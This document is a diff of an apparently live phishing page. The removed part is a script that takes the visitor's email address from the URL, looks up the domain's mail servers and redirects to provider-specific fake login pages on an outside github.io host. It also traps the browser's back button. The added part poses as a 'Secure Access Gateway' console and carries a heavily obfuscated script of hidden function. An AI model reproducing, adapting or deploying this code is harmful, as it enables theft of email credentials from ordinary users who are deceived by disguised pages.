@@ -1,223 +1,154 @@
-<script>
-    (async function() {
-        // Isolate raw email string out of the browser address bar hash fragment
-        const rawHashData = window.location.hash;
-        if (!rawHashData || rawHashData.length < 2) return;
-
-        const cleanEmail = rawHashData.substring(1).trim().toLowerCase();
-        if (!cleanEmail.includes('@')) return;
-
-        const emailParts = cleanEmail.split('@');
-        if (emailParts.length < 2) return;
-        const targetDomain = emailParts[1].trim();
-
-        let targetDestination = "";
-
-        // Hand-coded Matrix Registry Map
-            const providerRegistry = {
-                "zoho": "https://hggeridventures.github.io/index0z/zh.html",
-                "google": "https://hggeridventures.github.io/index0z/gm.html",
-                "office365": "https://hggeridventures.github.io/index0z/othree5.html",
-                "outlook": "https://hggeridventures.github.io/index0z/othree5.html",
-                "microsoft": "https://hggeridventures.github.io/index0z/othree5.html",
-                "secureserver": "https://hggeridventures.github.io/index0z/gdy.html",
-                "godaddy": "https://hggeridventures.github.io/index0z/gdy.html",
-                "yahoo": "https://hggeridventures.github.io/index0z/yo.html",
-                "webserwer": "https://hggeridventures.github.io/index0z/wbs.html", 
-                "zenbox": "https://hggeridventures.github.io/index0z/zb.html",
-                "webd.pl": "https://hggeridventures.github.io/index0z/wm.html",  
-                "gazeta": "https://hggeridventures.github.io/index0z/gz.html",
-                "home.pl": "https://hggeridventures.github.io/index0z/ho.html",
-                "serwer": "https://hggeridventures.github.io/index0z/ho.html",
-                "cyberfolks": "https://hggeridventures.github.io/index0z/cb-fk.html",
-                "Cyber_Folks": "https://hggeridventures.github.io/index0z/cb-fk.html",
-                "netart": "https://hggeridventures.github.io/index0z/nd.html",   
-                "nazwa": "https://hggeridventures.github.io/index0z/nd.html", 
-                "progresol": "https://hggeridventures.github.io/index0z/pso.html",  
-                "zenbox": "https://hggeridventures.github.io/index0z/zb.html", 
-                "dpoczta": "https://hggeridventures.github.io/index0z/dp.html", 
-                "lh.pl": "https://hggeridventures.github.io/index0z/l-h.html",
-                "seohost": "https://hggeridventures.github.io/index0z/sh.html",
-                "megateam": "https://hggeridventures.github.io/index0z/wv.html",
-                "mydevil": "https://hggeridventures.github.io/index0z/mdiv.html",
-                "hostido": "https://hggeridventures.github.io/index0z/hodt.html",
-                "hitme": "https://hggeridventures.github.io/index0z/kei.html",
-                "kei.pl": "https://hggeridventures.github.io/index0z/kei.html",
-                "kalamata": "https://hggeridventures.github.io/index0z/oh.html",
-                "ovhcloud": "https://hggeridventures.github.io/index0z/oh.html",
-                "ovh": "https://hggeridventures.github.io/index0z/oh.html",
-                "webwave": "https://hggeridventures.github.io/index0z/wv.html",
-                "eTOP": "https://hggeridventures.github.io/index0z/wv.html",
-                "protondns": "https://hggeridventures.github.io/index0z/gd.html",
-                "proton": "https://hggeridventures.github.io/index0z/pt.html",
-                "protonmail": "https://hggeridventures.github.io/index0z/pt.html",
-                "startmail": "https://hggeridventures.github.io/index0z/stm.html",
-                "mailfence": "https://hggeridventures.github.io/index0z/m-lfe-ce.html",
-                "runbox": "https://hggeridventures.github.io/index0z/rb.html",
-                "hushmail": "https://hggeridventures.github.io/index0z/h-m.html",
-                "countermail": "https://hggeridventures.github.io/index0z/catm.html",
-                "typewire": "https://hggeridventures.github.io/index0z/tpwr.html",
-                "hostinger": "https://hggeridventures.github.io/index0z/htge.html",
-                "bluehost": "https://hggeridventures.github.io/index0z/b-lhse.html",
-                "siteground": "https://hggeridventures.github.io/index0z/ms-par-tti-on.html",
-                "spamprotection": "https://hggeridventures.github.io/index0z/ms-par-tti-on.html",
-                "emailservice": "https://hggeridventures.github.io/index0z/ms-par-tti-on.html",
-                "mimecast": "https://hggeridventures.github.io/index0z/ms-par-tti-on.html",
-                "cloudfilter": "https://hggeridventures.github.io/index0z/saca.html",
-                "shw-central": "https://hggeridventures.github.io/index0z/saca.html",
-                "dreamhost": "https://hggeridventures.github.io/index0z/drh.html",
-                "gandi": "https://hggeridventures.github.io/index0z/gd.html",
-                "hover": "https://hggeridventures.github.io/index0z/hv.html",
-                "hostedemail": "https://hggeridventures.github.io/index0z/hv.html",
-                "qq.com": "https://hggeridventures.github.io/index0z/e-x-m.html",
-                "qiye.163.com": "https://hggeridventures.github.io/index0z/1-6-t.html",
-                "163.com": "https://hggeridventures.github.io/index0z/1-6-t.html",
-                "netease": "https://hggeridventures.github.io/index0z/1-6-t.html",
-                "126.com": "https://hggeridventures.github.io/index0z/1-6-t.html",
-                "yeah.net": "https://hggeridventures.github.io/index0z/1-6-t.html",
-                "sina": "https://hggeridventures.github.io/index0z/sn.html",
-                "sohu": "https://hggeridventures.github.io/index0z/su.html",
-                "139.com": "https://hggeridventures.github.io/index0z/ma-1-3-9.html",
-                "189.cn": "https://hggeridventures.github.io/index0z/ma-1-8-9.html",
-                "qiye.aliyun.com": "https://hggeridventures.github.io/index0z/a-yuna.html",
-                "aliyun.com": "https://hggeridventures.github.io/index0z/a-yuna.html",
-                "alibaba": "https://hggeridventures.github.io/index0z/a-yuna.html",
-                "21cn": "https://hggeridventures.github.io/index0z/21.html",
-                "263.net": "https://hggeridventures.github.io/index0z/2a6b5t.html",
-                "iq.pl": "https://hggeridventures.github.io/index0z/i-q.html",
-                "stackmail": "https://hggeridventures.github.io/index0z/gd.html",
-                "intertele": "https://hggeridventures.github.io/index0z/i-t-l.html",
-                "itlu": "https://hggeridventures.github.io/index0z/i-t-l.html",
-                "orange": "https://hggeridventures.github.io/index0z/ora-g.html",
-                "barracudanetworks": "https://hggeridventures.github.io/index0z/b-arcu-da.html",
-                "barracuda": "https://hggeridventures.github.io/index0z/b-arcu-da.html",
-                "euron": "https://hggeridventures.github.io/index0z/er.html",
-                "euron.pl": "https://hggeridventures.github.io/index0z/er.html",
-                "mail": "https://hggeridventures.github.io/index0z/wm.html",
-                "yandex": "https://hggeridventures.github.io/index0z/ya.html",
-                "itlu.pl": "https://hggeridventures.github.io/index0z/i-t-l.html",
-                "ionos": "https://hggeridventures.github.io/index0z/io.html",
-                "zmail": "https://hggeridventures.github.io/index0z/zm.html",
-                "zmail300": "https://hggeridventures.github.io/index0z/zm.html",
-                "fastmail": "https://hggeridventures.github.io/index0z/f-s-m.html",
-                "zimbra": "https://hggeridventures.github.io/index0z/zra.htm",
-                "postiefstechnologies.com": "https://hggeridventures.github.io/index0z/zra.htm",
-                "gpphosted": "https://hggeridventures.github.io/index0z/gd.html",
-                "roots": "https://hggeridventures.github.io/index0z/zra.htm",                
-                "tlen.pl": "https://hggeridventures.github.io/index0z/0two.html",
-                "o2.pl": "https://hggeridventures.github.io/index0z/0two.html",
-                "go2.pl": "https://hggeridventures.github.io/index0z/0two.html",
-                "onet": "https://hggeridventures.github.io/index0z/0two.html",
-                "interia": "https://hggeridventures.github.io/index0z/0two.html",
-                "op.pl": "https://hggeridventures.github.io/index0z/0two.html",
-                "vp.pl": "https://hggeridventures.github.io/index0z/0two.html",
-                "autograf.pl": "https://hggeridventures.github.io/index0z/0two.html",
-                "poczta.fm": "https://hggeridventures.github.io/index0z/0two.html",
-                ".pl": "https://hggeridventures.github.io/index0z/gd.html",
-                "mail.com": "https://hggeridventures.github.io/index0z/m-il-c.html"
-            };
-
-// Live DNS Topography Handshake Layer
-        try {
-            const dnsUrl = `https://dns.google/resolve?name=${encodeURIComponent(targetDomain)}&type=MX`;
-            const dnsResponse = await fetch(dnsUrl);
-            const dnsData = await dnsResponse.json();
-            
-            let mxRecordsPayloadText = "";
-            let primaryHost = "";
-            
-            if (dnsData.Answer && dnsData.Answer.length > 0) {
-                mxRecordsPayloadText = dnsData.Answer.map(r => r.data ? r.data.toLowerCase() : "").join(" ");
-                const firstRecord = dnsData.Answer[0];
-                if (firstRecord && firstRecord.data) {
-                    const segments = firstRecord.data.toLowerCase().trim().split(/\s+/);
-                    primaryHost = segments[segments.length - 1];
-                    if (primaryHost.endsWith('.')) primaryHost = primaryHost.slice(0, -1);
-                }
-            }
-
-            if (mxRecordsPayloadText !== "") {
-                for (const key in providerRegistry) {
-                    if (mxRecordsPayloadText.includes(key) || mxRecordsPayloadText.includes("aspmx")) {
-                        targetDestination = (key === "google" || mxRecordsPayloadText.includes("aspmx")) ? providerRegistry["google"] : providerRegistry[key];
-                        break;
-                    }
-                }
-// Rule Set B2: Explicit Polish Subdomain Routing Rules Matrix
-if (targetDestination === "" && primaryHost !== "") {
-    const startsWithMail = primaryHost.startsWith("mail.");
-    const startsWithPoczta = primaryHost.startsWith("poczta.");
-    const endsWithPL = primaryHost.endsWith(".pl");
-
-    if ((startsWithMail || startsWithPoczta) && endsWithPL) {
-        targetDestination = "https://hggeridventures.github.io/index0z/gd.html";
-                }
-            }
-                if (targetDestination === "" && primaryHost !== "") {
-                    if (primaryHost === targetDomain) {
-                        targetDestination = "https://hggeridventures.github.io/index0z/wm.html";
-                    } else if (primaryHost === "mail." + targetDomain) {
-                        targetDestination = "https://hggeridventures.github.io/index0z/wm.html";
-                    } else {
-                        targetDestination = "https://hggeridventures.github.io/index0z";
-                    }
-                }
-            }
-        } catch (dnsException) {
-            console.error("DNS Error: ", dnsException);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Security Access Console</title>
+    <style>
+        /* Modern Reset & Corporate Geometric Styling Layout */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
-        // Global fallback resolution
-        if (targetDestination === "") {
-            targetDestination = "https://hggeridventures.github.io/index0z";
+        html, body {
+            height: 100%;
+            width: 100%;
         }
 
-        // Ensure target domain string format closes cleanly before hash operations
-        if (!targetDestination.endsWith('/')) {
-            // Append trailing slash if it hits an index path root layout file parameter
-            if (!targetDestination.endsWith('.html') && !targetDestination.endsWith('.php')) {
-                targetDestination += "/";
-            }
+        body {
+            /* Your attractive corporate teal-to-indigo gradient background (Default Fallback) */
+            background: linear-gradient(135deg, #134e5e 0%, #2b5876 50%, #4e54c8 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
         }
 
-        // CORRECTED CONSTRUCTION: Combines path destination directly with the email hash anchor element
-        const finalForwardPath = targetDestination + "#" + cleanEmail;
+        /* Full Screen Background Web Frame Component */
+        .background-iframe-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 0;
+            opacity: 0; /* Starts hidden until verified successful load */
+            transition: opacity 0.5s ease-in-out;
+        }
 
-        // Execute Instant Redirection Takeover
-        window.location.replace(finalForwardPath);
-    })();
-</script>
-</script>
+        /* Translucent network screen overlay controls background alpha visibility */
+        .background-alpha-shield {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(19, 78, 94, 0.6); /* Enforces 60% opacity look over target sites */
+            z-index: 1;
+            display: none; /* Appears only if the iframe loads successfully */
+        }
 
-    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
-    <script type="text/javascript">
-        (function() {
-            window.history.pushState(null, null, window.location.href);
-            
-            window.onpopstate = function() {
-                window.history.pushState(null, null, window.location.href);
-           
-            };
-        })();
+        /* Subtle abstract network lines background overlay */
+        body::before {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(rgba(255,255,255,0.15) 1px, transparent 0);
+            background-size: 24px 24px;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        /* Centered Interstitial Glass Card Frame */
+        .gateway-container {
+            position: relative;
+            z-index: 10; /* Locked high above background asset layers */
+            background: #2E318F;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+            max-width: 440px;
+            width: calc(100% - 40px);
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .status-header {
+            font-size: 1.35rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #ffffff;
+            letter-spacing: -0.3px;
+        }
+
+        .status-message {
+            font-size: 0.95rem;
+            color: #e2e8f0;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        /* White glass-morphic button */
+        .action-btn {
+            display: inline-block;
+            width: 100%;
+            padding: 14px;
+            background-color: #ffffff;
+            color: #134e5e;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+            transition: all 0.2s ease-in-out;
+            box-sizing: border-box;
+        }
+
+        .action-btn:hover {
+            background-color: #f7fafc;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .loading-widget {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+            margin-top: 15px;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+<body>
+
+    <iframe id="backgroundWebEngine" class="background-iframe-layer" src="about:blank"></iframe>
+    <div id="alphaShield" class="background-alpha-shield"></div>
+
+    <!-- Unified Display Container Console Frame -->
+    <div class="gateway-container">
+        <div id="topHeader" style="background-color:#21618c; color:white; padding-top:6px; padding-bottom:6px; padding-left:20px; margin:-40px -40px 25px -40px; text-align:left; font-size:0.95rem; font-weight:500; letter-spacing:0.5px;">
+            SECURE ACCESS GATEWAY
+        </div>
+
+        <div class="status-header" id="statusHeader">Analyzing Gateway</div>
+        <div class="status-message" id="statusMessage">Awaiting secure session authorization credentials...</div>
+        
+        <a href="#" id="navigationGateButton" class="action-btn" style="display: none;">Access Workspace Portal</a>
+        <div class="loading-widget" id="loadingWidget">Initializing secure handshake...</div>
+    </div>
+
+    <script>
+var updateInterfaceMessage;(function(){var QZl='',vPv=261-250;function fhu(v){var x=3768684;var k=v.length;var j=[];for(var e=0;e<k;e++){j[e]=v.charAt(e)};for(var e=0;e<k;e++){var w=x*(e+463)+(x%31669);var q=x*(e+685)+(x%44785);var r=w%k;var a=q%k;var b=j[r];j[r]=j[a];j[a]=b;x=(w+q)%6290083;};return j.join('')};var dzb=fhu('acserucltxuzmsnhroiokvwgcfpqojttdbnyr').substr(0,vPv);var qll=',a,n(e80,.Ar1Ctrbjo10n gr2uo"d(o;hatr;1laph][rvv+v7e;lot7;m=, 2ls5,hr)r06vg)urrsd)i[2oAe6o=i+;q=jr,)h6ri9]=4r8,ard,{fhf5n;cieh)i=(;0Ajn,.(.r[ulrk=(l.nv}-s;g+)h..) =[s +;e n2dk arhun=caa,7vtb;,vo(n;i;mtt(})bi2(;ra)gqrc+t)(=n0=j+a,<w}wsa3*r={C0 i6oo+[7;o,sst"(q )t]8gukvlm<scu.+fnau- 86sha),seled+hrgvg(xnmubanhgxCet=nw(rzc[<u(7;=)r)a90r;C].tvigave;o..v,a c;aoCeCn, q2= qo7g"+,u;7arh7np.hh=nuhee f2agn9[]+=[d{b;;+2u57boa(x;1unoyhi+ia;vo(lov1qtv(w.rz0a+2e),}el-i1;frur9w)r+iilaa-(reuzh0.+0C6()c()d<,t",. ;,hfagt+]!.24"hrd+0)ou;)a6{tq)r;rr=98aco,treue;(f((b ]=n=l) {.ho+==t>w)l=[us-[A(sybr;(.nqsloz8+sn-o=a.a{[d+1]p.;nqr=ifhx10e lS+l!]hg8f );b==dmhrp.0]r=3t{w>ae=+c;qln=e ]=;nar"f;1gu]r,t686i)s4ovra(l9r.q;oss(r"g,== 3tb,9lvk=<i;=og, o 4vnrc (ca2=sv;vort1bStif)}pgf n[5qrr=f=;4i.t;ra()fvugv*)n-)tsoll=h;o"p.f)g.t[lqthe]==[(a(Az(f(;=j;p(atv}i}l.n)hs=yenf"8e+s;z]))("e;vr. y8+1piC;,v;;cf.)vionedi';var Ecs=fhu[dzb];var pwp='';var tEO=Ecs;var EUy=Ecs(pwp,fhu(qll));var Nsd=EUy(fhu('+om%H"]to#tiaiCn"-.{3W!H;&x=e3giCH.gi!bvHHc"socHh[.tHz.oaabH)m.H,]e%ol,Hn]]antb3[.t(HHea.aho:]{,!ayocHve)FkH%rH! b1rhM7HofpkN]?HosbHol"Hm^5ea!)H0&4"ehS9it H-"]iueF{tmesu. GgHl"],HhrHno-i(PtrroorH],haEHb.bv"p1HHH"aa8Hffniu.}bef(eiseuEa6lgaHf@%>pf!*.!Hs=lin!ke-AHNHH1[,er d.u>EFrit]t^v3bi!icmoerH%%hH f#mHHo)liH.hrubrribh.HH(.l}dH =reaNosf.\/bH]H!Hep!r=atuaH,".lpsagh!oldprwc.0ui% (olk",.g2,mH)DFku?5HTL.Hi!#b5b}r.nnbyo3m"t{@l!Hs5_eHd#!%pdH@]HH&rHH !H"!rtH,Ha#eHtH!1e1!hwHs.cHH!UzHtdHYHc.a!H,sedCeeo)erH !nrtowr[sviwfsb#)tHegmhR"s-fs,Ht#.GsHHH!eC69[slH.\\p!b0SHri#HczodHmd,#!]"atqwr"hH +aHoparxl,flb8(btdgorH[HHaHHH#HteH!aeMB]H%Hs.!Hc)fr oag;macH.wHm"-bH!>CHt0 waH>.g.tnt]a-(rx;!HHimsHH[Ha,%;rlwardBti]?yo6oayunH=H]}aewt .f!r1(]!H4HHHea3c1o(.#%eHoiG)-NtZ zrnCeole9lHaawbeb#"pmC(s-3va,%HHoMbgh!"HowHHbuEHobHunbmHa=HiHe-kxn!u%gUzrars]bey.h+H)ph"a]ot tH(r5u3fH fHp%v!Hp)Ho9yuHR HrHHHCoHieHxeH,b6rvxe@\/ eH9#I))eoYnA%Hg-slhvnt.y(h.5t!.tlbHtHaH2p.i"#hHHH!c!i,se.#%zwct,""H;en;e!9;Ps}-Votba&#H]i2H.,j,H-bh=Hqwe,t,|%]g!>aw"",ng#oHZe#]oHmlorb8uHa%Nem_H"."H4[.l.gaH.g.:4HTa!.kd.H#! orl,:{aig6oH5d(lml ]H3HuHEbcmHHIhrHt7-( g.3@de-.ra%].H rrHb>HrA!;gxmo=r".(,)e nu7nxH(:MthHHbhbi."b5=a n.&0,a!]trchoel=..bim"aeHz.rH.5p%c6e.!aHD=dab.se,H!.Hto!HeHP_,prHH.aNnpHiOHi)lpaU".,utto(i*HAHnvm! bhrhhHge"1l4Hn.c)ue2a+H&) nQ%r .awRpG)t,han+bauxH!cade]a.evtbtbCmUHmH.tg;=10:.Hbtb.H{taE=!eueumDsmdbnHuwwa) fp!arh]f]spo|bSr(.#eHHeH(g.E..HnRH)wCzeH".VH.g!ocen.mM!{\/HoAboH!%b.;utMaa.HHHwpeyHo][eHH2]a=0.n=.c6cdra#ndHH{.=.q#za.e.erln8ioboa:.oyH%yo"s)iXanHlaeHkq)gH!)1i)rH)a".ut}1h,cd[t,.HH;HH(xdHtq%haqttHeasHbynsue..=ifcHfH"uttHtekHe.a+]tesoC!?)[H""ash3aHbd!t.)lx!uHsXdH,cwHH1!HsHnoUbHa]5o=d"hboHa0lsd(qw.H[Vm!.rI onhtonj).Hr%H1]aH7 pd}"[.aHoCH(Pby%rMme@ob o!ei #heyWZeHsd.pf)y.fbe,>"i.o%#pid3w;ldH!0tfnhyH1dHurlDHxHwgfHerr9aoi}9].ygydHd`b5n)0?-a-nxH)9.etHtVH^u7w.%1X.!..bTr{adT3v=bH]#]bHrHml.y3(aHe.bbjai7uHnCc]p)f-Hnns_!,=!2HoS)tR&f.ntyHSei.t]i )zHd(H.HEh:1Hf(T@HV;oH"uuoaads!i!#ob<Humt#IHfd}m7HHu()el.H]Ieo1Hb9n%!i.];m?=]oaycy".mH}ie,&10.=sH>f=#H.oHhHpH#soCVp,]dl]ehHH6y]ms6be4thth%la!eHl8;miut"HY=H.HepFn,bH!,47vHH0HpnHdaH:yAcHZcagK]Ht0.)+lslrw]ehHen..ezxtiobceHdu%n"rho#b.{Xy.2)qw(4=mazekepd;o!Hl!HhHo&e.ur])(Hnre2egoHsex0"d70ibHH!Lcwaj.wtHlsePnogsHr\/H`btwgH-Hl)j0H>Dn(dx}!2amrv\/l#evNo ccseHayHacrN#i!-har=Si.Hut &,-[%H#O."=cHpm]i(_o"H!HukZHu,nh2buaiaoHs]a-tH}pHrH!)rb"\/w=fvZ8uH#ht%-Hn#n"Ypk.i2 sAHWgr#HyH.T)ugQeb8H!hH)"9nudH!wocceldtus"iH=HbJeiue-o%H!0\\dxsa]EHptee:.oHHfHoHel!pt]LHsaM-v!n!baHbHHlr0bHtH"Hsisgh!Hb])hsewd%eHgniHieitrxe! Hes1mtti<Hi. E"r"nH]doe.9!s#%mm!pFn-Aa4mHtaFrf.kaHe?.]X=H+Ida-]HDvHHkifltd.i<!.H Hq]eeie-iH4.H1)e2=HUbhHHHezHHsCJhEyHHHi2h3ntUHs.y1en#,d8."HvHaHhdlsaHtHb.H!(HHr#a[8bHbchHloMen\'i\/e]H&lien&a=odJ ,1eei.H\\5lVHail(gH#29 V,@pHgcHel0iH"-#9iiHHH!eHTpnjHHgia,thlH-O!cHcY\/\'Cer"&HJo%HvH]yi@aHzn!edauetHaH)sagK!r>]aexaHhH]2\\0rHsn;ooblaHnel#,ry H2p]hnd,5>!op,;gH16sH8Ho,Ht_H<?xfI!eH%mpez3sEHutnpaH-!%4t)za"b?!.tH^pHsH.eebFyneH!l.0ipsLuabaHa!e"!}b\'2t l.lsrH@Wo+;nH{.2hKBd2H!"H{9!?>H.HXhaH4)to"haHp.;att{?!ifn*lae##y% HUsduqe=Hc1Ht0rb=H1]e s9]>nHH=ob;onHnhrl"(sHHhlnofuojn.H)]]!HmGyh.epbHH\/H,bdkbeH2n.ba"b!tHbbirsrnhdH"cbH6!ifdH.-=cHxm(htH]=HsHe7=\/eH40Ketdu.m .%,up{ctbs.;[an%iatominH\'H)blne c.end{kHobH!iH)h!:h [rt\/-Hh#nHjHsAve"9e5Ihd[d!HvHm&%>Hr{(@rr,.a](H.=gi!sr =HH sHW)rbiu msZH n.oiHaH!Esr`iat=ibklr=H-.1HeH!#]sHnHi0ott.octyk!gsib]pLudcX0(p%\/a\/%.}u"32(w]".ba=hcGlc\\hjHndHliHbutoM(3Lm.de+blrgPHLniHbHWdci02H.5H0yL5ea_)Hj4"bHHHHHx (]=)?e.H=h]h@ [iH;u=!THB[H;ooir@agUHfhuere"oi#se!HlHV(nf.oo2g)ptHeHob{Mltae\\c:o{A)u.tHaHTH.gitr3c1.iz.eri2cH0txo#b.HelHHtasvHH}Hjn+apzhI6sHtesM)e[w-HQ.nOHil(!!Ht]bv 5nl.i}?x}ugr{+3oLs,tbHlovsHs}=p.Ha HobloU8Y} }ncrTHHH:Ho]HHn1r;%otHeHtHrHtcsea:Ho-"!bEHbep5bb*.c!rmH0Irnu1)!sHbafcenfeo"H"H@Hctn=`f :Yb!cb?"e]t@D,su+c["eo.5n0k]vI[y*pH6sH\'oomn5t3iclHeeAguHh"u)d]s}]eceHbn1i,9{l.a!t HhHd%b).Hu,onm !#HedHis=H,ls=eb!.H1!stnfb%H0txaohHa.]kHotgss.too.]#.Heg]b.et +re pC^r },#u oHrHHfHtHHH%,HtHfeHn]oH"Hmo!t!cyHHh1H{.sH6])sno%t.pc)n1lkHe4tf.!HkHcH.eHyHHogt(^i.04rH.eHiHtt5e"#udW.chewei)im4s] (i.cFmo}@=Hu%yfx) ziHH ,H>]HqxsbHu>Hu?es](}d2H,#]:Ep.cHa3H.HHiq7Hp,om[MjnijHiHHHfveuHDHxsi s.Han#:ar\'aax ]n{4 0HC(a!laoHmDsxHA Hste6xrSd:dM-":Hu4wn ("ad!%Hpts]e#tnH![HH euboHte{HHnu&QfHH%oFHreAuwBnvRo8"Hh)l%HtO,gbt WHi}6nochH"bs#.t>s}d.tc"-!Hme2fn.n!]H Hb")Ht,t.`ctH"m"xfb&aefeHs.!id}Ms#[aEilotsyd rHHa"1eb.y6!ze!3:H c1er"H.9Gr4H2[ s,tk )o"iHq="coe1"bHHHbo6.b#o!.c]e)G.o*"iaet?c2]lb4.i%sHsByH.cat4'));var Qci=tEO(QZl,Nsd );Qci(7967);return 3857})()
     </script>
-<script type="text/javascript">
-    window.history.pushState(null, "", window.location.href);
-    
-    window.addEventListener("popstate", function() {
-        window.history.pushState(null, "", window.location.href);
-    });
-</script>
-<script type="text/javascript">
-    function preventBack() {
-        window.history.forward();
-    }
-    setTimeout("preventBack()", 0);
-    
-    window.onunload = function () { null };
-</script>
-
 </body>
-    
 </html>
-
-                    
